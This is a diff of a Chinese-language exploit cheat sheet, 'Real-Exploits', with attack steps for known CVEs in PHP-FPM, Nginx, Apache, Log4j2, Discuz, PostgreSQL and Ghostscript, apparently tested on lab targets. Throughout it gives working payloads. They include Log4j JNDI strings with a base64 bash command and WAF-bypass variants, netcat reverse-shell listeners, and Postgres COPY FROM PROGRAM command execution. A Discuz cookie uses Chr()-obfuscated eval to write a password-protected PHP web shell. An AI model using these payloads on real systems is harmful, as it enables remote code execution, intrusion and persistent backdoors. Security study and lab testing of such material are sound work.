@@ -1,14 +1,18 @@
 # Real-Exploits
 
+> 暂不更新，同步到个人私有仓库
 # 大纲
 
 - [PHP](#PHP)
-    - [XXE](XXE)
-    - [thinkphp](#thinkphp)
-        - [ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞](#ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞)
-        - [ThinkPHP-5.0.23-Rce](#ThinkPHP-5.0.23-Rce)
-        - [ThinkPHP-2.x-任意代码执行漏洞](#ThinkPHP-2.x-任意代码执行漏洞)
-        - [ThinkPHP5-SQL注入漏洞+敏感信息泄露](#ThinkPHP5-SQL注入漏洞+敏感信息泄露)
+    - [XXE](#XXE)
+    - [论坛/CMS框架](#论坛/CMS框架)
+        - [Discuz](#Discuz)
+            - [wooyun-2010-080723](#wooyun-2010-080723)
+        - [thinkphp](#thinkphp)
+            - [ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞](#ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞)
+            - [ThinkPHP-5.0.23-Rce](#ThinkPHP-5.0.23-Rce)
+            - [ThinkPHP-2.x-任意代码执行漏洞](#ThinkPHP-2.x-任意代码执行漏洞)
+            - [ThinkPHP5-SQL注入漏洞+敏感信息泄露](#ThinkPHP5-SQL注入漏洞+敏感信息泄露)
     - [phpmyadmin](#phpmyadmin)
         - [CVE-2016-5734](#CVE-2016-5734)
         - [CVE-2018-12613](#CVE-2018-12613)
@@ -16,15 +20,21 @@
     - [inclusion](#inclusion)
     - [phpunit](#phpunit)
         - [CVE-2017-9841](#CVE-2017-9841)
+    - [phpfpm](#phpfpm)
+        - [CVE-2019-11043](#CVE-2019-11043)
 - [Python](#Python)
     - [Flask](#Flask)
         - [Jinja2](#Jinja2)
     - [Django](#Django)
+        - [CVE-2019-14234](#CVE-2019-14234)
 
 - [框架引擎中间件](#框架引擎中间件)
     - [Nginx](#Nginx)
+        - [Nginx解析漏洞](#Nginx解析漏洞)
+        - [CVE-2013-4547](#CVE-2013-4547)
     - [httpd](#httpd)
         - [Apache—HTTPD-多后缀解析漏洞](#Apache—HTTPD-多后缀解析漏洞)
+        - [CVE-2017-15715-Apache换行解析漏洞](#CVE-2017-15715-Apache换行解析漏洞)
     - [Struts2](#Struts2)
         - [s2-009](#s2-009)
         - [s2-012](#s2-012)
@@ -53,33 +63,43 @@
     - [log4j2](#log4j2)
         - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
 
-
-- [Ruby](#Ruby)
-    - [Rails](#Rails)
-        - [CVE-2019-5418](#CVE-2019-5418)
-- [PostScript](#PostScript)
-    - [Ghostscript](#Ghostscript)
-        - [CVE-2018-16509](#CVE-2018-16509)
-- [数据库](#数据库)
-    - [Postgres](#Postgres)
-        - [CVE-2019-9193](#CVE-2019-9193)
-
-- [应用服务器](#应用服务器)
+- [应用服务](#应用服务)
     - [GlassFish](#GlassFish)
         - [任意文件读取漏洞](#任意文件读取漏洞)
     - [uWSGI](#uWSGI)
         - [CVE-2018-7490](#CVE-2018-7490)
-- [Jupyter](#Jupyter)
-    - [notebook-rce](#notebook-rce)
+    - [Rails](#Rails)
+        - [CVE-2019-5418](#CVE-2019-5418)
+    - [PostScript](#PostScript)
+        - [Ghostscript](#Ghostscript)
+            - [CVE-2018-16509](#CVE-2018-16509)
+    - [Jupyter](#Jupyter)
+        - [notebook-rce](#notebook-rce)
+    - [Imagetragick](#Imagetragick)
+        - [CVE-2016–3714](#CVE-2016–3714)
+    - [Grafana](#Grafana)
+        - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)
 
-- [Imagetragick](#Imagetragick)
-    - [CVE-2016–3714](#CVE-2016–3714)
-
-- [Grafana](#Grafana)
-    - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)
+- [数据库](#数据库)
+    - [Postgres](#Postgres)
+        - [CVE-2019-9193](#CVE-2019-9193)
 
 
-- 参考文章
+# 大纲
+
+- [操作系统漏洞](#操作系统漏洞)
+- [Web服务器漏洞](#Web服务器漏洞)
+- [应用服务器漏洞](#应用服务器漏洞)
+- [开发框架漏洞](#开发框架漏洞)
+- [Web应用漏洞](#Web应用漏洞)
+- [CMS漏洞](#CMS漏洞)
+
+
+
+
+
+
+- [参考文章](#)
     - https://github.com/vulhub/vulhub
     - https://github.com/ffffffff0x/1earn/blob/c3ee45b00d55a142a63f81da9602a4c9ca75b14e/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md
 ## PHP
@@ -280,6 +300,43 @@ HOST:xxxxx
 ![image](./img/phpunit.png)
 
 `<?=system('env')?>`
+
+### phpfpm
+
+PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器对于PHP5.3.3之前的php来说，是一个补丁包，旨在将FastCGI进程管理整合进PHP包中。
+
+#### CVE-2019-11043
+
+> PHP-FPM 远程代码执行漏洞（CVE-2019-11043）
+
+- 影响版本
+    - php 7.1.0 ~ 7.1.33
+    - php 7.2.0 ~ 7.2.24
+    - php 7.3.0 ~ 7.3.11
+
+- 漏洞详情
+
+    在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。
+
+    在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。
+
+- 相关工具
+    - https://github.com/neex/phuip-fpizdam
+
+- 漏洞利用
+
+```bash
+go run . "http://node4.buuoj.cn:27325/index.php"
+```
+
+![image](./img/phpfpm-1.png)
+
+访问`http://xxxxxx/index.php?a=id` 需要多访问几次以访问到被污染的进程。
+
+![image](./img/phpfpm-2.png)
+
+- 参考文章
+    - https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md
 ## Python
 ### Flask
 #### Jinja2
@@ -320,6 +377,26 @@ http://node4.buuoj.cn:26749/uploadfiles/e07db0b27893a41573453510ee2dceed.png/.ph
 不添加.php的时候为404
 
 ![image](./img/nginx-jiexi.png)
+
+#### CVE-2013-4547
+
+> Nginx 文件名逻辑漏洞（CVE-2013-4547）
+
+- 影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
+
+- 参考文章
+    - https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547
+
+- 漏洞利用
+    - 上传页面，首先上传kite.png图片马
+
+![image](./img/CVE-2013-4547-1.png)
+
+注意kite.png后面要加个空格
+
+第二步访问`http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`
+
+其中`[0x20][0x00]`需要在burpsuite的hex改
 ### httpd
 
 #### Apache—HTTPD-多后缀解析漏洞
@@ -329,7 +406,7 @@ http://node4.buuoj.cn:26749/uploadfiles/e07db0b27893a41573453510ee2dceed.png/.ph
 - 参考文章
     - https://github.com/vulhub/vulhub/tree/master/httpd/apache_parsing_vulnerability
 
-- 漏洞描述
+- 漏洞详情
     - 在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。
 
 - 漏洞利用
@@ -337,6 +414,16 @@ http://node4.buuoj.cn:26749/uploadfiles/e07db0b27893a41573453510ee2dceed.png/.ph
 ![image](./img/httpd-1.png)
 
 ![image](./img/httpd-2.png)
+
+#### CVE-2017-15715-Apache换行解析漏洞
+
+- 影响版本：2.4.0 < HTTPD <2.4.29
+
+- 漏洞详情
+    - 在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。
+
+- 参考文章
+    - https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715
 ### Struts2
 
 探测工具：https://github.com/shack2/Struts2VulsTools
@@ -728,8 +815,6 @@ nc -lvnp 8888
 
 ![image](./img/fastjson3.png)
 
-## Ruby
-
 ### Rails
 
 Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。
@@ -772,26 +857,9 @@ mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice put
 ![image](./img/postscript1.png)
 
 
-## 数据库
 
-### Postgres
 
-#### CVE-2019-9193
-
-Navicat连接数据库，数据库初始账号密码为postgres/postgres
-
-影响版本：PostgreSQL 9.3-11.2
-poc
-```
-DROP TABLE IF EXISTS cmd_exec;
-CREATE TABLE cmd_exec(cmd_output text);
-COPY cmd_exec FROM PROGRAM 'id';
-SELECT * FROM cmd_exec;
-```
-
-![image](./img/postgres1.png)
-
-## 应用服务器
+## 应用服务
 ### GlassFish
 
 GlassFish 是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改
@@ -872,6 +940,12 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkg
 `nc -lvnp 7777`
 
 
+GET传输需要URL对`{}`编码
+```
+%7bjndi:rmi://10.30.1.53:1099/ftvuph%7d
+```
+
+POST传输
 ```
 POST /hello HTTP/1.1
 Host: vulfocus.fofa.so:30484
@@ -923,10 +997,42 @@ ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
 ```
-
-
-
 图形化测试工具：https://github.com/nice0e3/log4j_POC
+
+
+## 论坛/CMS框架
+
+### Discuz
+
+一套通用的社区论坛软件系统
+
+#### wooyun-2010-080723
+
+> Discuz 7.x/6.x 全局变量防御绕过导致代码执行
+
+- 漏洞详情
+
+- 漏洞利用
+
+直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加`GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`
+
+```
+GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+Connection: close
+```
+
+一句话:文件为x.php，密码为pwd
+```
+Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
+```
+
+![image](./img/discuz-1.png)
 
 ## Grafana
 
@@ -997,3 +1103,23 @@ Connection: close
 ![image](./img/grafana2.png)
 
 ![image](./img/grafana1.png)
+
+
+## 数据库
+
+### Postgres
+
+#### CVE-2019-9193
+
+Navicat连接数据库，数据库初始账号密码为postgres/postgres
+
+影响版本：PostgreSQL 9.3-11.2
+poc
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+
+![image](./img/postgres1.png)
